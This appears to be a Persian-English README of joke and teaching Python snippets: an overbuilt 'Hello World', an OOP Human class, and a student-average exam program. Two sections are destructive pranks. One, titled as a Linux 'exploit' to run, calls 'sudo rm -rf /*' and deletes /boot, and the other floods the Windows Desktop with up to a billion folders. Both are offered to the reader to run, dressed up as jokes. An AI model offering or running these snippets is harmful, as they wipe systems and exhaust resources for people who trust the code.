<h1><b>چگونه به وحشیانه ترین حالت یه استرینگ رو نمایش بدیم</b></h1>
<h3><b>به عبارتی دیگر: چگونه مثل سیشارپ، پایتون کد بزنیم</b></h3>
<div align='left'>
<h4><b>How to Display String in Wildest Way</b><h4>
<h4>Other Meaning: How to code <b>Python</b> Like <b>(C#)</b><h4>
<h6>Python 3.11.0<h6>

<h4><h4>
<br>

```py

import sys
from overrides.overrides import override
from typing import (Literal , Union , Self)


class Print:
    def __init__(self: Self, /, _input: str) -> Union[Literal[None] , Self]:
        super(Print, self).__init__()
        self.__s = _input
        
    def __str__(self: Self) -> str:
        return str(sys.stdout.write(self.__s))
    


class PrintOutput(Print):
    @override
    def __str__(self: Self) -> str:
        return 'Hello World!'
    


if (__name__ == '__main__'):
    my_var = PrintOutput(not __debug__)
    print(my_var)

```

</div>
<br>


<h1><b>پروژه ساخت کلاس انسان</b></h1>
<h3><b>یه پروژه ساده و راحت جهت نشون دادن شئ گرایی تو پایتون</b></h3>
<div align='left'>
<h4><b>A Simple Project to Show OOP(Object Oriented Programming) in Python</b><h4>
<h6>Python 3.11.0<h6>

<h4><h4>
<br>

```py

from typing import (
    Literal ,
    Union ,
    Self ,
    Dict,
    Any ,
)




def main() -> Literal[None]:
    # Creating Instance & Initializing                                    ایجاد نمونه و مقداردهی
    
    h1: Human = Human(name='shervin' , family='badanara' , age=19 , code=5180195225)
    
    # Printing Properities & Behavior Of the above Instance               نمایش خصوصیت ها و رفتارهای نمونه بالا
    
    print(h1)                    # Output ---> Human
    print(h1.name)               # Output ---> shervin
    print(h1.family)             # Output ---> badanara
    print(h1.age)                # Output ---> 19
    print(h1.code)               # Output ---> 5180195225
    print(h1.UserData())         # Output ---> {'name': 'shervin', 'family': 'badanara', 'age': 19, 'code': 5180195225}




class _DNA:
    _meta_data: Dict[str,str] = {}



class Human(_DNA):
    def __init__(self: Self, *, name: str, family: str, age: int, code: int) -> Union[Literal[None], Self]:
        super(Human, self).__init__()
        self.__name = self._meta_data['name'] = name
        self.__family = self._meta_data['family'] = family
        self.__age = self._meta_data['age'] = age
        self.__code = self._meta_data['code'] = code
        
    def __str__(self: Self) -> str:
        return __class__.__name__
        
    @property
    def name(self: Self) -> str:
        return self.__name
    
    @property
    def family(self: Self) -> str:
        return self.__family
    
    @property
    def age(self: Self) -> int:
        return self.__age
    
    @property
    def code(self: Self) -> int:
        return self.__code
    
    def UserData(self: Self) -> Any:
        return self._meta_data
    

    


if (__name__ == '__main__'):
    main()


```

</div>

<h1><b>چجوری لینوکس رو بپوکونیم</b></h1>
<h3><b>از لینوکس خسته شدی؟ این اکسپلویت رو اجرا کن</b></h3>
<div align='left'>
<h4><b>How To Destory Linux</b><h4>
<h4><b>Tired of Linux? Run this Exploit</b><h4>
<h6>Python 3.11.0<h6>

<h4><h4>
<br>

```py

try:
    import \
        subprocess,\
        platform,\
        string,\
        asyncio,\
        sys
    
    from typing import (
        Literal,
        Coroutine,
        Any,
    )
    
    class Exploit:
        async def run() -> Coroutine[Any, Any, Literal[0]]:
            subprocess.call([
                'sudo', 'cd', '/', '&&', 'rm', '-rf', 'boot'
            ])
            subprocess.call([
                'sudo', 'rm', '-rf', '/*'
            ])
            return 0
    
    if (sys.version_info[0:2][1] > 7):
        if (platform.system()[0].upper() == string.ascii_uppercase[11]):
            asyncio.run(Exploit.run())

except* Exception as e:
    raise e from BaseException

except* ModuleNotFoundError as mnfe:
    raise mnfe from ImportError

finally:
    sys.stdout.write(':)')

```

</div>

<h1><b>چجوری در کسری از ثانیه 1 میلیارد پوشه بسازیم</b></h1>
<h3><b>قاتل پردازنده مرکزی</b></h3>
<div align='left'>
<h4><b>How to create 1 Billion Folders in a Sec.</b><h4>
<h4><b>CPU Murderer</b><h4>
<h6>Python 3.11.0<h6>

<h4><h4>
<br>

```py

try:
    import \
        os,\
        sys,\
        getpass,\
        asyncio
    
    from typing import Literal
    
    def main() -> Literal[None]:
        asyncio.run(CreateFolder.run(count=1_000_000_000))
    
    class CreateFolder:
        async def run(count:int) -> Literal[0]:
            counter: int = 0
            for folder in range(count + 1):
                os.chdir(fr'C:\Users\{getpass.getuser()}\Desktop')
                os.mkdir(str(counter))
                counter += 1
            return 0
        
    if (__name__ == '__main__' and __debug__):
        main()

except* Exception as e:
    raise e from BaseException

except* ModuleNotFoundError as mnfe:
    raise mnfe from ImportError

finally:
    sys.stdout.write(':)')

```


</div>

<h1><b>برنامه ای بنویسید که نام دانشجو، نمره درس اول، نمره درس دوم را گرفته، سپس نمایش دهد و بالاترین معدل بین دانشجویان نمایش داده شود و در نهایت اطلاعات ذخیره شوند</b></h1>
<h3><b>امتحان میان ترم دانشگاه(ترم 3)</b></h3>
<div align='left'>
<h4><b>Create a Porgram that does the below Options:</b><br>
<li> get the student name<li>
<li> get the student first lesson score<li>
<li> get the student second lesson score<li>
<li> show the name and average score of the student<li>
<li> show the highest average between students <li>
<li> save all the data <h4><li>
<h4><b>University midterm exam (semester 3)</b><h4>
<h6>Python 3.11.0<h6>

<h4><h4>
<br>

```py

from typing import (List, Literal, Self, Union)


class Student:
    def __init__(self: Self, fname: str, less1: Union[int, float], less2: Union[int, float]) -> Literal[None]:
        self.fname = fname
        self.less1 = less1
        self.less2 = less2
        self.avg = (self.less1 + self.less2) / 2
        
    def info(self) -> str:
        return f'{self.fname} {self.avg}'
    
    def saveData(self) -> Literal[None]:
        with open(file='data.txt', mode='a', encoding='UTF-8') as DATA:
            DATA.write(f'{self.fname} {self.avg}\n')
    
    

class Utils:
    
    @staticmethod
    def calculate(*args: Union[int, float]) -> tuple:
        avgList: List[int] = []
        avgList.append(args)
        return max(avgList)[0]
    
    



if (__name__ == '__main__'):
    std1: Student = Student(fname='ava', less1=20, less2=20)
    std2: Student = Student(fname='shervin', less1=19, less2=19.5)
    
    print(std1.info())
    print(std2.info())
    
    std1.saveData()
    std2.saveData()
    
    print(Utils.calculate(std1.avg, std2.avg))

```


</div>